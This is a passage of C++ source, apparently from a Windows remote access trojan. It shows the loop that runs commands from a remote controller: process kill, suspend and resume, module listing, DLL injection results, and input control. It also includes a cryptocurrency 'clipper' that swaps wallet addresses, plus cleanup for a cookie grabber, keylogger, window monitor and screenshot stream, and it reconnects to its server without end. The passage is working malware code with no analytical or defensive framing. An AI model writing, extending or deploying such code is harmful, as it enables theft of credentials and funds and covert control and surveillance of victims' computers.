                    send(sock, response.c_str(), response.length(), 0);
                    std::cout << "[INJECTION] Failed to inject DLL into PID " << pid << "\n";
                }
                continue;
            }
            
            // Process management commands - structured PROCESS_RESULT responses
            DWORD pid;
            if (sscanf(command, "process_kill %lu", &pid) == 1) {
                std::cout << "[PROCESS] Killing PID " << pid << "\n";
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                if (!hProc) {
                    char resp[256];
                    sprintf(resp, "PROCESS_RESULT|kill|fail|%lu|Failed to open process", pid);
                    sendResponse(sock, resp);
                    continue;
                }
                BOOL success = TerminateProcess(hProc, 0);
                CloseHandle(hProc);
                {
                    char resp[256];
                    if (success) {
                        sprintf(resp, "PROCESS_RESULT|kill|success|%lu|Process terminated", pid);
                    } else {
                        sprintf(resp, "PROCESS_RESULT|kill|fail|%lu|TerminateProcess failed", pid);
                    }
                    sendResponse(sock, resp);
                }
                continue;
            }
            
            if (sscanf(command, "process_suspend %lu", &pid) == 1) {
                std::cout << "[PROCESS] Suspending PID " << pid << "\n";
                HANDLE hProc = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
                if (!hProc || !NtSuspendProcess) {
                    char resp[256];
                    sprintf(resp, "PROCESS_RESULT|suspend|fail|%lu|Failed to open process", pid);
                    sendResponse(sock, resp);
                    if (hProc) CloseHandle(hProc);
                    continue;
                }
                NTSTATUS status = NtSuspendProcess(hProc);
                CloseHandle(hProc);
                {
                    char resp[256];
                    if (NT_SUCCESS(status)) {
                        sprintf(resp, "PROCESS_RESULT|suspend|success|%lu|Process suspended", pid);
                    } else {
                        sprintf(resp, "PROCESS_RESULT|suspend|fail|%lu|NtSuspendProcess failed", pid);
                    }
                    sendResponse(sock, resp);
                }
                continue;
            }
            
            if (sscanf(command, "process_resume %lu", &pid) == 1) {
                std::cout << "[PROCESS] Resuming PID " << pid << "\n";
                HANDLE hProc = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
                if (!hProc || !NtResumeProcess) {
                    char resp[256];
                    sprintf(resp, "PROCESS_RESULT|resume|fail|%lu|Failed to open process", pid);
                    sendResponse(sock, resp);
                    if (hProc) CloseHandle(hProc);
                    continue;
                }

                // Call NtResumeProcess multiple times to ensure the suspend count drops to 0.
                NTSTATUS status;
                for (int i = 0; i < 10; ++i) {
                    status = NtResumeProcess(hProc);
                }
                CloseHandle(hProc);
                
                {
                    char resp[256];
                    if (NT_SUCCESS(status)) {
                        sprintf(resp, "PROCESS_RESULT|resume|success|%lu|Process resumed", pid);
                    } else {
                        sprintf(resp, "PROCESS_RESULT|resume|fail|%lu|NtResumeProcess failed", pid);
                    }
                    sendResponse(sock, resp);
                }
                continue;
            }

            if (sscanf(command, "module_list %lu", &pid) == 1) {
                std::cout << "[PROCESS] Listing modules for PID " << pid << "\n";
                char moduleBuffer[65536];
                DWORD bytesWritten = 0;
                if (GetProcessModules(pid, moduleBuffer, sizeof(moduleBuffer), &bytesWritten)) {
                    std::string response = "MODULE_LIST_RESPONSE|" + std::string(moduleBuffer, bytesWritten) + "\n";
                    send(sock, response.c_str(), response.length(), 0);
                } else {
                    sendResponse(sock, "MODULE_LIST_RESPONSE|[]");
                }
                continue;
            }
            
            // Clipper address update: SET_CLIPPER|{"BTC":"addr",...}
            if (istrnicmp(command, "SET_CLIPPER|", 12) == 0) {
                std::string json = std::string(command + 12);
                UpdateClipperAddresses(json);
                std::cout << "[CLIPPER] Addresses updated\n";
                continue;
            }

            // Input control (mouse move/click, keyboard) — handled last so it
            // doesn't interfere with any explicit command above.
            if (strncmp(command, "mouse_move ", 11) == 0 ||
                strncmp(command, "mouse_click ", 12) == 0 ||
                strncmp(command, "key_press ", 10) == 0) {
                if (strncmp(command, "mouse_click ", 12) == 0)
                    dbgLog(command); // trace every click before dispatch
                HandleInputControl(command);
                continue;
            }

            // Unknown command
            sendResponse(sock, "Unknown command");
            } // end inner line-processing while
        }
        
        // === CLEANUP ON DISCONNECT ===
        // Stop threads
        cookieGrabRunning = false;
        StopClipperThread();
        StopWindowMonitor();
        if (keyloggerRunning) {
            StopKeyboardHook();
            keyloggerRunning = false;
        }
        if (IsScreenshotStreaming()) {
            StopScreenshotStream();
        }
        
        closesocket(sock);
        WSACleanup();
        
        std::cout << "[MAIN] Disconnected. Reconnecting in 5 seconds...\n";
        Sleep(5000);
        // Loop back to top of while(true) to reconnect
    }
    
    // Never reached - infinite reconnect loop
    // Mutex is automatically released when process exits
    return 0;
}
